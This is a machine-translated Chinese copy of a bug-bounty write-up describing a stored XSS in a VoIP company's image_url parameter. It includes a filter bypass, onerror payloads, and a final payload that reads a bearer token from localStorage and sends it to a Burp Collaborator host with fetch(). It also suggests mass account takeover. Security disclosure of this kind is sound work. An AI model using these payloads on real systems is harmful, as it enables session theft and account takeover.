<html>
<head>
<title>Stored XSS to Organisation Takeover</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">组织接管存储的XSS</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/stored-xss-to-organisation-takeover-6eaaa2fdcd5b?source=collection_archive---------4-----------------------#2021-05-10">https://infosecwriteups.com/stored-xss-to-organisation-takeover-6eaaa2fdcd5b?source=collection_archive---------4-----------------------#2021-05-10</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><figure class="gl gn jo jp jq jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi jn"><img src="../Images/3d383dbaf9234b6753659179df1c0d03.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*hIPs1wRWUHCqOnYvfKo-Kw.jpeg"/></div></div></figure><p id="3269" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">TL；DR:这是一篇关于我如何绕过XSS滤波器，从本地存储器中窃取会话令牌，从而接管一家领先的VoIP公司的文章。</p><h1 id="ab29" class="kw kx iq bd ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt bi translated">介绍</h1><blockquote class="lu lv lw"><p id="889c" class="jy jz lx ka b kb kc kd ke kf kg kh ki ly kk kl km lz ko kp kq ma ks kt ku kv ij bi translated">我一直喜欢深入事物。XSS不仅仅是找到警报盒，它的意义远不止于此。绕过过滤器是发现可怕的XSS臭虫的重要部分。我们应该总是试图将XSS病毒升级为账户接管。</p></blockquote><p id="beaf" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">这是一个私人项目。我尝试了所有不同的功能&amp;文本功能引起了我的注意。通过此功能，我们可以向组织用户发送带有附件的文本。我开始发送一条附有图片的文本，并捕获了打嗝套件中的所有流量。在点击发送按钮时，应用程序首先请求在云存储上上传图像，然后请求带有参数text、image_url和其他重要参数的补丁，</p><p id="d0ea" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">我直接去追<strong class="ka ir"> image_url </strong>。我试着把image_url从最初上传的图片url改成一个随机的&amp;服务器接受了它。</p><figure class="mc md me mf gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi mb"><img src="../Images/0142a75b53b0499d90ad41d815baddfb.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*6Ng5G-_9m3UD-wKbmq9E7g.png"/></div></div><figcaption class="mg mh gj gh gi mi mj bd b be z dk translated">修补程序请求中易受攻击的参数“image_url”</figcaption></figure><p id="c8c7" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">并且URL被反映为与<img/>标签和<code class="fe mk ml mm mn b">s1600"</code>字符串连接在一起</p><figure class="mc md me mf gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi mo"><img src="../Images/ae022aed13579275cbc7092008f78a60.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*nBHqoVfloJB3hX-Ka60ugw.png"/></div></div><figcaption class="mg mh gj gh gi mi mj bd b be z dk translated">image_url的<img/>标记中的HTML反射</figcaption></figure><p id="1fb6" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">我立刻变得兴奋起来，开始测试端点</p><ol class=""><li id="e23b" class="mp mq iq ka b kb kc kf kg kj mr kn ms kr mt kv mu mv mw mx bi translated">首先，我在Image_url参数中放了一个不同的图像URL。服务器接受了它</li><li id="456d" class="mp mq iq ka b kb my kf mz kj na kn nb kr nc kv mu mv mw mx bi translated">我在image_url参数中放了一个非URL值，它也被接受了。</li><li id="2a5c" class="mp mq iq ka b kb my kf mz kj na kn nb kr nc kv mu mv mw mx bi translated">现在我马上尝试了<code class="fe mk ml mm mn b">javascript:alert()</code>，但是javascript在前端把它改成了<code class="fe mk ml mm mn b">javascript:void(0)</code>。</li><li id="e9da" class="mp mq iq ka b kb my kf mz kj na kn nb kr nc kv mu mv mw mx bi translated">我试图摆脱引号，但这是安全编码。</li><li id="293a" class="mp mq iq ka b kb my kf mz kj na kn nb kr nc kv mu mv mw mx bi translated">我试图用黑盒方法破坏过滤器，但没有成功。</li></ol><p id="d71c" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">真正让我好奇的一件事是为什么字符串<code class="fe mk ml mm mn b">s1600</code>在前端连接到image_url值？所以我寻找负责这个的javascript。在分析javascript时，在image_url参数中的一个或多个字符后添加双空格会在前端创建下面提到的HTML内容。</p><figure class="mc md me mf gt jr gh gi paragraph-image"><div class="gh gi nd"><img src="../Images/ad71c4858159900f404348722c96f618.png" data-original-src="https://miro.medium.com/v2/resize:fit:768/format:webp/1*FKMpFH0PA8xpWi1rJ8kDdQ.png"/></div><figcaption class="mg mh gj gh gi mi mj bd b be z dk translated">HTML反射</figcaption></figure><p id="0a72" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">之后，我在image_url参数中尝试了多个有效载荷。</p><p id="633c" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">有效载荷1</p><p id="5075" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated"><code class="fe mk ml mm mn b"><strong class="ka ir"><em class="lx">image_url="xxx test"</em></strong></code></p><p id="788a" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">在HTML中的反映就像</p><p id="36eb" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated"><code class="fe mk ml mm mn b">&lt;img src="xxx "="tests1600"&gt;</code></p><p id="0fe4" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">有效载荷2</p><p id="9ac1" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated"><code class="fe mk ml mm mn b"><strong class="ka ir"><em class="lx">image_url=</em>"xxx onerror=test"</strong></code></p><p id="8250" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">在HTML中的反映就像</p><p id="bc4d" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated"><code class="fe mk ml mm mn b">&lt;img src="xxx "onerror="tests1600"&gt;</code></p><p id="6e97" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">有效载荷3</p><p id="e42d" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated"><code class="fe mk ml mm mn b"><strong class="ka ir"><em class="lx">image_url=</em>"xxx onerror=alert(document.cookie);"</strong></code></p><p id="2195" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">在HTML中的反映就像</p><p id="d117" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated"><code class="fe mk ml mm mn b">&lt;img src="xxx "onerror="alert(document.cookie);s1600"&gt;</code></p><p id="20df" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated"><strong class="ka ir">我在:D页面得到了一个漂亮的警告框</strong></p><figure class="mc md me mf gt jr gh gi paragraph-image"><div class="gh gi ne"><img src="../Images/0c198b30ae05592f010b8161c60e8a77.png" data-original-src="https://miro.medium.com/v2/resize:fit:802/format:webp/1*z5V5zFLBxN3AvhXjkKt44A.png"/></div><figcaption class="mg mh gj gh gi mi mj bd b be z dk translated">XSS警报箱</figcaption></figure><p id="7916" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">为了避免重复，我立即将报告发送给相关程序，而没有为帐户接管创建实际的POC。ASE团队的回复是</p><figure class="mc md me mf gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi nf"><img src="../Images/077d49fe97b05c325d3e77f4228bec24.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*iMDLUZRNJy3VdabOuTYp8g.png"/></div></div></figure><p id="6693" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">现在我得想办法接管这个账户。首先，我想到通过XSS绕过CSRF保护来利用任何电子邮件更改功能。尽管如此，我看到影响是有限的，因为管理帐户只能改变电子邮件id。在经历了不同的请求之后，我看到该应用程序在基于cookies的认证之上也使用了不记名令牌。应用程序以JSON格式在本地存储中存储不记名令牌。</p><h1 id="69f3" class="kw kx iq bd ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt bi translated">局部存储器</h1><figure class="mc md me mf gt jr gh gi paragraph-image"><div class="gh gi ng"><img src="../Images/0bda8553278a78b8da0fbfbd66db3a06.png" data-original-src="https://miro.medium.com/v2/resize:fit:1024/format:webp/1*S5uClkMP_xt5kLdJUrmoIw.png"/></div></figure><p id="0e87" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">本地存储是浏览器用来存储键/值对的Web存储API。它为每个域(原点)维护一个单独的存储区域。即使浏览器关闭，数据仍保留在本地存储中。可以通过Window.localStorage对象访问本地存储。我们还可以在开发工具中检查本地存储。</p><figure class="mc md me mf gt jr gh gi paragraph-image"><div class="gh gi nh"><img src="../Images/b8ccfd92a19aa17787bf9a4cdc568170.png" data-original-src="https://miro.medium.com/v2/resize:fit:924/format:webp/1*bpRTsWSDoUk6cG2lSae3VQ.png"/></div></figure><p id="e272" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">我们可以通过javascript读取本地存储。若要检索密钥，请使用。<code class="fe mk ml mm mn b">getItem()</code>。</p><p id="a67c" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated"><code class="fe mk ml mm mn b">localStorage.getItem('Key')</code></p><figure class="mc md me mf gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi ni"><img src="../Images/9f7623d3a5dbf23fea8f5502402157d4.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/1*Z0uj2-lSKvb6r7_yP9FJfw.gif"/></div></div></figure><p id="3c8f" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">我们可以用<code class="fe mk ml mm mn b">JSON.parse</code>来解析这个键的JSON值</p><p id="c6f2" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated"><code class="fe mk ml mm mn b">json.parse(localStorage.getItem('Key')).KEYNAME</code></p><figure class="mc md me mf gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi nj"><img src="../Images/8f37047590552473dd0717135e6eb2e4.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/1*e50bg7YoNWPJj2LAEv-eKQ.gif"/></div></div></figure><p id="40c5" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated"><strong class="ka ir">从本地存储器窃取访问令牌</strong></p><p id="92e3" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">现在，您已经了解了我们如何从本地存储中访问数据。就很容易理解最终的有效载荷。如前所述，应用程序将无记名令牌存储在本地存储中。让我来分解我最后的有效载荷。</p><ol class=""><li id="3d02" class="mp mq iq ka b kb kc kf kg kj mr kn ms kr mt kv mu mv mw mx bi translated">我首先从本地存储器<br/> <code class="fe mk ml mm mn b">token=JSON.parse(localStorage.getItem('KEYNAME')).access_token</code>中检索access_token</li><li id="ea73" class="mp mq iq ka b kb my kf mz kj na kn nb kr nc kv mu mv mw mx bi translated">我的Burp协作者URL的串联令牌<br/> <code class="fe mk ml mm mn b">url=https://g0h5el9lym4iht5u2co4ovymud03os.burpcollaborator.net/'token</code></li><li id="5586" class="mp mq iq ka b kb my kf mz kj na kn nb kr nc kv mu mv mw mx bi translated">向URL发送获取请求以接收令牌<br/> <code class="fe mk ml mm mn b">fetch(url)</code></li></ol><p id="eff2" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">参数image_url的最终有效负载:</p><p id="18b4" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated"><code class="fe mk ml mm mn b">"xxx onerror=token=JSON.parse(localStorage.getItem('KEYNAME')).access_token,url=https://g0h5el9lym4iht5u2co4ovymud03os.burpcollaborator.net/'+token,fetch(url);"</code></p><p id="86a3" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">它在HTML中反映为</p><p id="c7aa" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated"><code class="fe mk ml mm mn b">&lt;img src="xxx" onerror="token=JSON.parse(localStorage.getItem('KEYNAME')).access_token,url='https://g0h5el9lym4iht5u2co4ovymud03os.burpcollaborator.net/'+token,fetch(url);s1600"&gt;</code></p><figure class="mc md me mf gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi nk"><img src="../Images/7f9cbb0bb79186e5081c94b4e4534091.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*4HcIENe81Wi21Zwksh3h3A.png"/></div></div><figcaption class="mg mh gj gh gi mi mj bd b be z dk translated">已收到打嗝请求。</figcaption></figure><h1 id="99ed" class="kw kx iq bd ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt bi translated">让攻击更上一层楼</h1><p id="d1b9" class="pw-post-body-paragraph jy jz iq ka b kb nl kd ke kf nm kh ki kj nn kl km kn no kp kq kr np kt ku kv ij bi translated">该VoIP提供商提供了一系列联系号码。我们可以通过将消息有效负载发送到一个完整的数字序列来进行批量帐户接管&amp;在批量级别获得访问令牌。</p><p id="f447" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">你可以在推特上关注我。</p></div></div>    
</body>
</html>